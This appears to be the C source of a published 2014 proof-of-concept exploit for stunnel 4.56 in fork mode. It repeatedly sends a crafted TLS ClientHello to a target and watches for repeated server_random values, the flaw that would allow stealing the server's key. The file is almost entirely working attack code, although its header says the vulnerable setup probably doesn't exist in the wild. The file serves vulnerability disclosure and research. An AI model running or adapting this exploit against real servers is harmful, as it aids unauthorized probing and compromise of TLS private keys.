/* stunnel 4.56 - fork key stealing proof of concept
 * (c)2014 Aris Adamantiadis <aris@badcode.be>
 * This exploit will only work on Stunnel compiled in fork mode
 * with openbsd, on a combination of openssl version that probably
 * doesn't exist in the wild.
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <openssl/rand.h>
#include <assert.h>

#define HOST	"localhost"

#define PORT	443

#define NSESSIONS 1000
#define COOKIELEN 32
#define NTHREADS 1

char *host=HOST;
int port=PORT;
int verbose;
int counter=0;
volatile int found = 0;

/* global token table */
struct cache {
	uint8_t servercookie[COOKIELEN];
};

struct cache session_cache[NSESSIONS];
int nsessions=0;
int sessionsptr=0;

pthread_rwlock_t lock = PTHREAD_RWLOCK_INITIALIZER;

int add_session(unsigned char cookie[COOKIELEN]){
	struct cache *p;
	int rc;
	if (pthread_rwlock_wrlock(&lock) != 0) {
		perror("pthread_rwlock_wrlock");
		exit(-1);
	}
	rc = sessionsptr;
	p=&session_cache[sessionsptr];
	memcpy(p->servercookie,cookie,COOKIELEN);
	sessionsptr++;
	if(sessionsptr >= NSESSIONS)
		sessionsptr=0;
	nsessions++;
	if(nsessions >= NSESSIONS)
		nsessions=NSESSIONS;
	if (pthread_rwlock_unlock(&lock) != 0) {
		perror("pthread_rwlock_unlock");
		exit(-1);
	}
	return rc;
}

int check_session(uint8_t cookie[COOKIELEN]){
	int i;
	int rc = -1;
	if (pthread_rwlock_rdlock(&lock) != 0) {
		perror("pthread_rwlock_rdlock");
		exit(-1);
	}

	for(i=0;i<nsessions;++i){
		if(memcmp(session_cache[i].servercookie,cookie,COOKIELEN)==0){
			printf("Found ! hash %d\n", counter);
			found = 1;
			rc = i;
			break;
		}
	}
	if (pthread_rwlock_unlock(&lock) != 0) {
		perror("pthread_rwlock_unlock");
		exit(-1);
	}

	return rc;
}

void print_hexa(const char *title, unsigned char *buffer, int len){
	int i;
	static pthread_mutex_t mlock = PTHREAD_MUTEX_INITIALIZER;
	pthread_mutex_lock(&mlock);
	printf("%s: ", title);
	for(i=0;i<len;++i){
		if(i % 8 == 0 && i > 0)
			printf(" ");
		if(i % 32 == 0 && i > 0)
			printf("\n");
		printf("%.2hhx",buffer[i]);
	}
	printf("\n");
	pthread_mutex_unlock(&mlock);
}

int tcp_connect(const char *host, int port){
	struct hostent *hp;
	struct sockaddr_in addr;
	int sock;

	if(!(hp=gethostbyname(host))){
		printf ("Couldn't resolve host %s\n", host);
		return -1;
	}

	memset(&addr,0,sizeof(addr));
	addr.sin_addr=*(struct in_addr*) hp->h_addr_list[0];
	addr.sin_family=AF_INET;
	addr.sin_port=htons(port);

	sock=socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
	if(connect(sock,(struct sockaddr *)&addr, sizeof(addr))<0){
		perror("Connecting socket");
		close(sock);
		return -1;
	}

	return sock;
}

struct __attribute__((packed)) record_h {
	uint8_t type;
	uint16_t version;
	uint16_t len;
};

struct __attribute__ ((packed)) handshake_h{
	uint8_t type;
	uint8_t padding;
	uint16_t len;
};

struct __attribute__ ((packed)) serverhello {
	struct record_h record;
	struct handshake_h handshake;
	uint16_t version;
	uint8_t server_random[32];
	uint8_t session_id_len;
	uint16_t cipher_suite;
	uint8_t compression_method;
	uint16_t extensions_len;
};

struct __attribute__ ((packed)) certificate {
	struct record_h record;
	struct handshake_h handshake;
	uint8_t padding;
	uint16_t certs_len;
};

struct __attribute__ ((packed)) key_exchange {
	struct record_h record;
	struct handshake_h handshake;
	struct __attribute__((packed)) {
		uint8_t curvetype;
		uint16_t namedcurve;
	} ecparameters;
};

struct __attribute__((packed)) clienthello  {
	struct record_h record;
	struct handshake_h handshake;
	/* client hello */
	struct __attribute__((packed)){
		uint16_t version;
		uint8_t client_random[32];
		uint8_t sessionid_len;
		uint16_t ciphersuite_len;
		uint16_t ciphersuites[80];
		uint8_t comp_len;
		uint8_t comp_methods[1];
		uint16_t extensions_len;
		uint8_t extensions[109];
	} clienthello;
};

/* courtesy wireshark */

const char ciphersuites[]=
		"\xc0\x30\xc0\x2c\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00"
		"\xa3\x00\x9f\x00\x6b\x00\x6a\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x32"
		"\xc0\x2e\xc0\x2a\xc0\x26\xc0\x0f\xc0\x05\x00\x9d\x00\x3d\x00\x35\x00"
		"\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00"
		"\x0a\xc0\x2f\xc0\x2b\xc0\x27\xc0\x23\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00"
		"\xa2\x00\x9e\x00\x67\x00\x40\x00\x33\x00\x32\x00\x9a\x00\x99\x00"
		"\x45\x00\x44\xc0\x31\xc0\x2d\xc0\x29\xc0\x25\xc0\x0e\xc0\x04\x00"
		"\x9c\x00\x3c\x00\x2f\x00\x96\x00\x41\x00\x07\xc0\x11\xc0\x07\xc0"
		"\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00"
		"\x11\x00\x08\x00\x06\x00\x03\x00\xff";
const char extensions[]=
		/* ec_point_formats */
		"\x00\x0b\x00\x04\x03\x00\x01\x02"
		/* elliptic_curves */
		"\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18"
		"\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15"
		"\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
		"\x00\x11"
		/* sessionticket TLS */
		"\x00\x23\x00\x00"
		/* signature_algorithms */
		"\x00\x0d\x00\x20\x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03"
		"\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03"
		/* heartbeat */
		"\x00\x0f\x00\x01\x01";

static void *mainthread(void *unused){
	int sock;
	struct clienthello hello;
	uint8_t buffer[1600];
	struct serverhello *shello;
	do {

		sock=tcp_connect(host,port);
		if(sock < 0)
			return NULL;
		hello.record.type = 0x16; /* handshake */
		hello.record.version = htons(0x301); /* TLS 1.0 */
		hello.record.len = htons(314);
		hello.handshake.type = 0x01; /* client hello */
		hello.handshake.padding = 0;
		hello.handshake.len = htons(310);
		hello.clienthello.version = htons(0x0303); /* TLS 1.2 */
		*(unsigned int *)hello.clienthello.client_random = htonl(time(NULL));
		RAND_bytes(&hello.clienthello.client_random[4], 28);
		//memset(&hello.clienthello.client_random[4], 0, 28);
		hello.clienthello.sessionid_len = 0;
		hello.clienthello.ciphersuite_len = htons(160);
		memcpy (hello.clienthello.ciphersuites, ciphersuites, 160);
		hello.clienthello.comp_len = 0x01;
		hello.clienthello.comp_methods[0] = 0x00; /*comp_null */
		hello.clienthello.extensions_len = htons(109);
		memcpy(hello.clienthello.extensions, extensions, 109);
		send(sock,&hello, sizeof(hello), 0);
		recv(sock, &buffer, sizeof(buffer), 0);


		shello = (struct serverhello *) &buffer;
		/* handshake */
		if(shello->record.type != 0x16){
			goto err;
		}
		/* serverhello */
		if(shello->handshake.type != 0x2){
			goto err;
		}
		print_hexa("server random", shello->server_random, 32);
		check_session(shello->server_random);
		add_session(shello->server_random);
		counter++;
		close(sock);
	} while(found == 0);
	//printf("Exiting thread\n");
	return NULL;
err:
	printf("parsing error\n");
	return NULL;
}

int main(int argc, char **argv) {
	int c,i;
	pthread_t threads[NTHREADS];

	while((c=getopt(argc,argv,"h:p:v"))!=-1){
		switch(c){
		case 'h':
			host=strdup(optarg);
			break;
		case 'p':
			port=atoi(optarg);
			if(port <=0 || port > 65535){
				printf("%s invalid port number\n", optarg);
				exit(1);
			}
			break;
		case 'v':
			verbose++;
		}
	}
	printf("Exploiting %s:%d\n", host, port);
	signal(SIGPIPE,SIG_IGN);

	for (i=0;i<NTHREADS;++i){
		pthread_create(&threads[i], NULL, mainthread, NULL);
	}
	for (i=0;i<NTHREADS;++i){
		pthread_join(threads[i], NULL);
	}
	//while (!found)
	//	sleep(1);
	printf("Counter : %d\n", counter);
	return 0;
}
